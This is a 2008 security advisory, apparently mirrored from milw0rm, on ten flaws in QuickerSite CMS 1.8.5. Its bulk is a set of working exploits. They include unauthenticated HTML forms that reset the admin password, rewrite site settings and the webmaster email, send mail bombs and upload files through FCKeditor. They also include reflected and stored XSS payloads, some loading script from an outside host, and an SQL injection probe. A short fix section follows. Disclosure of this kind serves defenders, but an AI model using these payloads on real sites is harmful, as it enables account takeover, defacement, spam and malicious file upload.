<html><head><title>QuickerSite 1.8.5 Multiple Remote Vulnerabilities </title></head><pre>########################## www.BugReport.ir #######################################
#
#        AmnPardaz Security Research Team
#
# Title: QuickerSite Multiple Vulnerabilities
# Vendor: www.quickersite.com
# Vulnerable Version: 1.8.5
# Exploit: Available
# Impact: High
# Fix: N/A
# Original Advisory: http://bugreport.ir/index.php?/39
###################################################################################

####################
1. Description:
####################
    QuickerSite is a Content Management System for Windows Servers. It is written in ASP/VBScript with an optional pinch of ASP.NET for true image-resizing capabilities. QuickerSite ships with an Access database, with the option to upsize to SQL Server 2000/2005 for busy sites (&gt;1000 visitors/day).
####################
2. Vulnerabilities:
####################
    2.1. Insecure Direct Object Reference [in &quot;bs_login.asp&quot;]. Everyone can change admin password.
        2.1.1. Exploit:
                Check the exploit section.
    2.2. Insecure Direct Object Reference [in &quot;bs_login.asp&quot;]. Everyone can edit all the site info., such as admin email address.
        2.2.1. Exploit:
                Check the exploit section.
    2.3. Insecure Direct Object Reference [in &quot;bs_login.asp&quot;]. Everyone can edit all the site design. (Also, all the site settings can be changed by other parameters)
        2.3.1. Exploit:
                Check the exploit section.
    2.4. Failure to Restrict URL Access [in &quot;mailPage.asp&quot;]. Everyone can mailbomb others.
        2.4.1. Exploit:
                Check the exploit section.
    2.5. Cross Site Scripting (XSS) [in &quot;showThumb.aspx&quot;]. Reflected XSS attack by circumventing the ASP.Net XSS denier (Path disclosure on the open error mode).
        2.5.1. Exploit:
                Check the exploit section.
    2.6. Cross Site Scripting (XSS), Failure to Restrict URL Access [in &quot;process_send.asp&quot;]. Redirect Reflected XSS Attack In &quot;SB_redirect&quot; parameter. Reflected XSS, Content Spoofing In &quot;SB_feedback&quot; parameter. Everyone can mailbomb others.
        2.6.1. Exploit:
                Check the exploit section.
    2.7. Cross Site Scripting (XSS) [in &quot;picker.asp&quot;]. Reflected XSS attack in &quot;paramCode&quot; and &quot;cColor&quot; parameters.
        2.7.1. Exploit:
                Check the exploit section.
    2.8. Cross Site Scripting (XSS) [in &quot;rss.asp&quot;]. Stored XSS attack in &quot;X-FORWARDED-FOR&quot;,&quot;QueryString&quot;,&quot;Referer&quot;&quot; header parameter. Attacker can execute an XSS against Admin.
        2.8.1. Exploit:
                Check the exploit section.
    2.9. File uploading is allowed by FCKEDITOR.
        2.9.1. Exploit:
                Check the exploit section.
    2.10. Injection Flaws [in &quot;/asp/includes/contact.asp&quot;]. SQL Injection on &quot;check&quot; function in &quot;sNickName&quot; parameter.
        2.10.1. Exploit:
                Check the exploit section.
####################
3. Exploits:
####################

    Original Exploit URL: http://bugreport.ir/index.php?/39/exploit
    3.1. Everyone can change admin password.
        -------------
        &lt;form action=&quot;http://[URL]/asp/bs_login.asp?btnAction=cSaveAdminPW&quot; method=&quot;post&quot;&gt;
        adminPassword: &lt;input type=&quot;text&quot; name=&quot;adminPassword&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        adminPasswordConfirm: &lt;input type=&quot;text&quot; name=&quot;adminPasswordConfirm&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        &lt;input type=&quot;submit&quot; /&gt;
        &lt;/form&gt;
        -------------
    3.2. Everyone can edit all the site info., such as admin email address.
        -------------
        &lt;form action=&quot;http://[URL]/asp/bs_login.asp?btnAction=saveAdmin&quot; method=&quot;post&quot;&gt;
        Site Url: &lt;input type=&quot;text&quot; name=&quot;sUrl&quot; value=&quot;http://www.VICTIM.com&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Site AlternateDomains: &lt;input type=&quot;text&quot; name=&quot;sAlternateDomains&quot; value=&quot;http://www.VICTIM-Backup.com&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Description: &lt;input type=&quot;text&quot; name=&quot;sDescription&quot; value=&quot;Hacked Description&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Site Name: &lt;input type=&quot;text&quot; name=&quot;siteName&quot; value=&quot;Hacked Site Name&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Site Title: &lt;input type=&quot;text&quot; name=&quot;siteTitle&quot; value=&quot;Hacked Site Title&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        CopyRight: &lt;input type=&quot;text&quot; name=&quot;copyRight&quot; value=&quot;Hacked CopyRight&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Keywords: &lt;input type=&quot;text&quot; name=&quot;keywords&quot; value=&quot;Hacked KeyWords&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Google Analytics: &lt;input type=&quot;text&quot; name=&quot;googleAnalytics&quot; value=&quot;Hacked Google Anal!&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Language: &lt;input type=&quot;text&quot; name=&quot;language&quot; value=&quot;1&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        DatumFormat: &lt;input type=&quot;text&quot; name=&quot;sDatumFormat&quot; value=&quot;1&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Webmaster: &lt;input type=&quot;text&quot; name=&quot;webmaster&quot; value=&quot;Hacker&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Webmaster Email: &lt;input type=&quot;text&quot; name=&quot;webmasterEmail&quot; value=&quot;MyEmail-ResetPassword@Hacker.Com&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Default RSS Link: &lt;input type=&quot;text&quot; name=&quot;sDefaultRSSLink&quot; value=&quot;http://www.VICTIM.com/RSS.asp&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        &lt;input type=&quot;submit&quot; /&gt;
        &lt;/form&gt;
        -------------
    3.3. Everyone can edit all the site design.
        -------------
        &lt;form action=&quot;http://[URL]/asp/bs_login.asp?btnAction=saveDesign&quot; method=&quot;post&quot;&gt;
        siteWidth: &lt;input type=&quot;text&quot; name=&quot;siteWidth&quot; value=&quot;800&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        menuWidth: &lt;input type=&quot;text&quot; name=&quot;menuWidth&quot; value=&quot;600&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        bgColorSides: &lt;input type=&quot;text&quot; name=&quot;bgColorSides&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        bgImageLeft: &lt;input type=&quot;text&quot; name=&quot;bgImageLeft&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        bgImageRight: &lt;input type=&quot;text&quot; name=&quot;bgImageRight&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        mainBGColor: &lt;input type=&quot;text&quot; name=&quot;mainBGColor&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        mainBgImage: &lt;input type=&quot;text&quot; name=&quot;mainBgImage&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        scheidingsLijnColor: &lt;input type=&quot;text&quot; name=&quot;scheidingsLijnColor&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        scheidingsLijnWidth: &lt;input type=&quot;text&quot; name=&quot;scheidingsLijnWidth&quot; value=&quot;100&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        menuBGColor: &lt;input type=&quot;text&quot; name=&quot;menuBGColor&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        menuBGImage: &lt;input type=&quot;text&quot; name=&quot;menuBGImage&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        menuBorderColor: &lt;input type=&quot;text&quot; name=&quot;menuBorderColor&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        MenuHoverBGColor: &lt;input type=&quot;text&quot; name=&quot;MenuHoverBGColor&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        subMenuBorderColor: &lt;input type=&quot;text&quot; name=&quot;subMenuBorderColor&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        fontType: &lt;input type=&quot;text&quot; name=&quot;fontType&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        fontColor: &lt;input type=&quot;text&quot; name=&quot;fontColor&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        linkColor: &lt;input type=&quot;text&quot; name=&quot;linkColor&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        fontSize: &lt;input type=&quot;text&quot; name=&quot;fontSize&quot; value=&quot;10&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        fontWeight: &lt;input type=&quot;text&quot; name=&quot;fontWeight&quot; value=&quot;10&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        publicIconColor: &lt;input type=&quot;text&quot; name=&quot;publicIconColor&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        publicIconColorHover: &lt;input type=&quot;text&quot; name=&quot;publicIconColorHover&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        siteAlign: &lt;input type=&quot;text&quot; name=&quot;siteAlign&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        menuLocation: &lt;input type=&quot;text&quot; name=&quot;menuLocation&quot; value=&quot;&quot; size=&quot;30&quot; /&gt;&lt;br /&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;defaultTemplate&quot; value=&quot;EEE&quot; size=&quot;30&quot; /&gt;
        &lt;input type=&quot;submit&quot; /&gt;
        &lt;/form&gt;
        -------------
    3.4. Everyone can mailbomb others.
        -------------
        &lt;form action=&quot;http://[URL]/mailPage.asp?iId=HILHG&quot; method=&quot;post&quot;&gt;
        &lt;input type=&quot;text&quot; name=&quot;btnAction&quot; value=&quot;sendPage&quot; /&gt;
        &lt;input type=&quot;text&quot; name=&quot;sEmail&quot; value=&quot;&quot; /&gt;
        &lt;input type=&quot;submit&quot; /&gt;
        &lt;/form&gt;
        -------------
    3.5. Reflected XSS attack by circumventing the ASP.Net XSS denier (Path disclosure on the open error mode).
        -------------
        http://[URL]/showThumb.aspx?img=test.jpg&amp;close='STYLE='IRSDL:expr/**/ession(alert(&quot;XSS&quot;))   (IE)
        http://[URL]/showThumb.aspx?img=test.jpg&amp;close='STYLE='-moz-binding:url(%22http://ha.ckers.org/xssmoz.xml%23xss%22) (Mozilla)
        http://[URL]/showThumb.aspx?img=test.jpg&amp;close='STYLE='IRSDL:expr/**/ession(alert(&quot;XSS&quot;));-moz-binding:url(%22http://ha.ckers.org/xssmoz.xml%23xss%22)   (IE+Mozilla)
        http://[URL]/showThumb.aspx (Path disc.)
        -------------
    3.6. Redirect Reflected XSS Attack In &quot;SB_redirect&quot; parameter in &quot;process_send.asp&quot;. Reflected XSS, Content Spoofing In &quot;SB_feedback&quot; parameter in &quot;process_send.asp&quot;. Everyone can mailbomb others.
        -------------
        &lt;form action=&quot;http://[URL]/default.asp?iId=HILHG&amp;pageAction=send&quot; method=&quot;post&quot;&gt;
        MailTo: &lt;input type=&quot;text&quot; name=&quot;SB_emailto&quot; value=&quot;&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Subject: &lt;input type=&quot;text&quot; name=&quot;SB_subject&quot; value=&quot;&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        Messgae: &lt;input type=&quot;text&quot; name=&quot;Messgae&quot; value=&quot;&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        SB_feedback: &lt;input type=&quot;text&quot; name=&quot;SB_feedback&quot; value=&quot;XSS&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        SB_redirect: &lt;input type=&quot;text&quot; name=&quot;SB_redirect&quot; value=&quot;XSS&quot; size=&quot;100&quot; /&gt;&lt;br /&gt;
        &lt;input type=&quot;submit&quot; /&gt;
        &lt;/form&gt;
        -------------
    3.7. Reflected XSS attack in &quot;paramCode&quot; and &quot;cColor&quot; parameters in &quot;picker.asp&quot;
        -------------
        http://[URL]/asp/colorpicker/picker.asp?paramCode=pickerPanel.value=''};alert('XSS')&lt;/script&gt;&lt;script&gt;
        http://[URL]/asp/colorpicker/picker.asp?cColor=irsdl&lt;script&gt;alert('XSS')&lt;/script&gt;
        -------------
    3.8. Stored XSS attack in &quot;X-FORWARDED-FOR&quot;,&quot;QueryString&quot;,&quot;Referer&quot;&quot; header parameter. Attacker can execute an XSS against Admin.
        -------------
        Header must like this:

        GET /rss.asp?iId=IHJEF&amp;s=&quot;'&gt;&lt;script&gt;alert('XSS-QueryString!')&lt;/script&gt; HTTP/1.1
        Host: [URL]
        User-Agent: Not
        Referer: FooNotSite.com&quot;'&gt;&lt;script&gt;alert('XSS-Referer!')&lt;/script&gt;
        X-FORWARDED-FOR: &quot;'&gt;&lt;script&gt;alert('XSS-Proxy!')&lt;/script&gt;
        ACCEPT-LANGUAGE: test
        Accept-Encoding: gzip,deflate
        Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
        Keep-Alive: 300
        Proxy-Connection: keep-alive
        -------------
    3.9. File uploading is allowed by FCKEDITOR.
        -------------
        &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://[URL]/fckeditor251/editor/filemanager/connectors/asp/upload.asp&quot; method=&quot;post&quot;&gt;
        &lt;input type=&quot;file&quot; name=&quot;NewFile&quot;&gt;&lt;br&gt;
        &lt;input type=&quot;submit&quot; value=&quot;Send it to the Server&quot;&gt;
        &lt;/form&gt;
        -------------
    3.10. SQL Injection on &quot;check&quot; function in &quot;sNickName&quot; parameter.
        -------------
        http://[URL]/default.asp?pageAction=profile
        Change &quot;Nickname&quot; to &quot;'or'1'='1&quot; and &quot;'or'1'='2&quot; and see the results
        -------------
####################
4. Solution:
####################
    Edit the source code to ensure that inputs are properly sanitized for 3.5, 3.6, 3.7, 3.8, 3.10, And use access control for others.
    Note: First check the vendor and look for the patch.
####################
- Credit :
####################
AmnPardaz Security Research &amp; Penetration Testing Group
Contact: admin[4t}bugreport{d0t]ir
WwW.BugReport.ir
WwW.AmnPardaz.com

# milw0rm.com [2008-06-03]</pre></html>